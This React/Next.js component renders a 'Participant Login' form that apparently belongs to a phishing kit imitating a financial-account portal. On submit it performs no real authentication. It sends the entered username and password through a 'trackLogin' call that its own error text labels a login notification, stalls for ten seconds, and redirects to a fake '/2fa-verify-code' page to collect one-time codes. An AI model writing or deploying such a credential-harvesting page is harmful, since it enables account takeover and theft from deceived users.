"use client"

import { useState, useEffect } from "react"
import { Eye, EyeOff } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { trackLogin } from "@/lib/actions"
import { useRouter } from "next/navigation"

export function LoginForm() {
  const [showPassword, setShowPassword] = useState(false)
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const router = useRouter()

  useEffect(() => {
    if (typeof window !== "undefined") {
      sessionStorage.clear()
    }
  }, [])

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault()
    if (!username || !password || isLoading) return

    setIsLoading(true)
    try {
      const result = await trackLogin(username, password)
      if (!result?.success) {
        setIsLoading(false)
        return
      }
    } catch (err) {
      console.error("Login notification error:", err)
      setIsLoading(false)
      return
    }
    await new Promise((resolve) => setTimeout(resolve, 10000))
    if (typeof window !== "undefined") sessionStorage.setItem("emp_otp1", "1")
    router.push("/2fa-verify-code")
  }

  return (
    <div
      className="prelogin-pod login-pod mx-auto lg:ml-[230px]"
      style={{
        width: '312px',
        height: '327px',
        backgroundColor: 'rgb(255, 255, 255)',
        border: '1px solid rgb(214, 214, 214)',
        borderRadius: '32px',
        padding: '24px',
        fontFamily: 'Arimo, Arial, sans-serif',
        fontSize: '14px',
        color: 'rgb(54, 54, 54)',
        boxSizing: 'border-box',
        marginBottom: '28px',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'space-between'
      }}
    >
      
      <style jsx>{`
        @media (min-width: 1024px) {
          .login-pod {
            width: 255px !important;
            padding: 14px 18px !important;
          }
        }
      `}</style>
      <div className="flex flex-col flex-1">
        <h1 className="text-gray-700 text-base font-bold mb-3">Participant Login</h1>

        <div className="space-y-3">
          <div className="relative">
            <svg
              className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" />
            </svg>
            <Input
              type="text"
              placeholder="Username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isLoading}
              className="pl-10 pr-4 h-11 lg:h-10 border rounded-lg text-gray-700 text-sm border-gray-300 disabled:opacity-70 disabled:pointer-events-none"
            />
          </div>

          <div className="relative">
            <svg
              className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-400"
              fill="currentColor"
              viewBox="0 0 20 20"
            >
              <path
                fillRule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clipRule="evenodd"
              />
            </svg>
            <Input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading}
              className="w-full pl-10 pr-10 h-11 lg:h-10 border rounded-lg text-gray-700 text-sm border-gray-300 disabled:opacity-70 disabled:pointer-events-none"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              disabled={isLoading}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 disabled:opacity-70 disabled:pointer-events-none"
            >
              {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
            </button>
          </div>
        </div>

        <div className={`mt-3 text-center ${isLoading ? "pointer-events-none opacity-70" : ""}`}>
          <a href="#" className="text-blue-600 hover:text-blue-700 text-[13px] font-medium underline underline-offset-4">
            Forgot username/password?
          </a>
        </div>
      </div>

      <div className="mt-4">
        <form onSubmit={handleSignIn}>
          <Button 
            type="submit" 
            disabled={isLoading}
            className="w-full bg-[#0074da] hover:bg-[#005fb3] text-white font-bold py-2 rounded-lg text-base disabled:opacity-50 disabled:cursor-not-allowed disabled:pointer-events-none"
          >
            {isLoading ? "SIGNING IN..." : "SIGN IN"}
          </Button>
        </form>
      </div>
    </div>
  )
}
